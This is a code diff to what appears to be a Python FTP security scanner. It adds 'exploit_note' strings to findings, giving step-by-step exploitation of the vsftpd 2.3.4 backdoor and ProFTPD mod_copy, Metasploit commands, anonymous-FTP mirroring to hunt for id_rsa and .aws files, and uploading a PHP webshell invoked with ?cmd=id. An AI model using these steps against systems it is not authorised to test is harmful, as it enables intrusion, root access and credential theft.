@@ -316,10 +316,26 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
             # Known-backdoor / RCE builds from the banner.
             for rx, (sev, title, detail, cwes, kind, cmd) in _KNOWN_BAD:
                 if banner and rx.search(banner):
+                    note = ""
+                    tier = ""
+                    if kind == "ftp_backdoor":
+                        note = ("For vsftpd 2.3.4: nc IP 21 ; USER x:) ; PASS y ; "
+                                "then in second terminal: nc IP 6200 ; id -- if "
+                                "root shell, you're in. Or: msfconsole -x 'use "
+                                "unix/ftp/vsftpd_234_backdoor; set RHOSTS IP; run'.")
+                        tier = "t0"
+                    elif kind == "ftp_rce":
+                        note = ("For ProFTPD: nc IP 21 ; SITE CPFR /etc/passwd ; "
+                                "SITE CPTO /tmp/recce_canary_passwd ; expect 250, "
+                                "then read via anon FTP GET /tmp/recce_canary_passwd. "
+                                "For CrushFTP: metasploit auxiliary/scanner/http/"
+                                "crushftp_rce_cve_2024_4040.")
+                        tier = "t0"
                     out.append(_finding(
                         sev, title, tgt, f"Banner: {banner}. {detail}", "metasploit",
                         cmd, "Upgrade to a vendor-clean build immediately; the current "
-                        "one is compromised/vulnerable.", cwes, kind=kind))
+                        "one is compromised/vulnerable.", cwes, kind=kind,
+                        exploit_note=note, depth_tier=tier))
                     break
             if pr.get("anonymous"):
                 out.append(_finding(
@@ -331,7 +347,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "ftp <ip>   # user 'anonymous', any password; or nmap --script "
                     "ftp-anon -p21 <ip>",
                     "Disable anonymous access unless the content is deliberately public "
-                    "and read-only.", ["CWE-306", "CWE-287"], kind="anon_ftp"))
+                    "and read-only.", ["CWE-306", "CWE-287"], kind="anon_ftp",
+                    exploit_note=(
+                        "wget -m --no-passive ftp://anonymous:recce@IP:21/ ; or "
+                        "lftp -u anonymous, ftp://IP -e 'find; quit' -- grep for "
+                        "backup.tar, .git, .aws, id_rsa"),
+                    depth_tier="t1"))
             # PASV response leaks the server-chosen data-channel IP; when it's
             # RFC1918 and differs from the control-channel IP, the server is
             # disclosing internal topology (RFC 959 Sec 4.1.2 / CWE-200).
@@ -504,7 +525,12 @@ def write_proof_finding(ip: str, port: int, proof: dict,
         "ftp / web shell",
         "put shell.php   # if the FTP root backs a web root this is direct RCE",
         "Remove write access for anonymous/low-priv principals; separate the FTP root "
-        "from any web root.", ["CWE-732", "CWE-434"], kind="writable_ftp")
+        "from any web root.", ["CWE-732", "CWE-434"], kind="writable_ftp",
+        exploit_note=(
+            "ftp IP ; then: put shell.php ; then: curl "
+            "http://IP/shell.php?cmd=id -- if FTP root != web root, put "
+            "webshell in every candidate path (uploads/, public/, htdocs/)."),
+        depth_tier="t2")
 
 
 # --- proof screenshot -----------------------------------------------------------
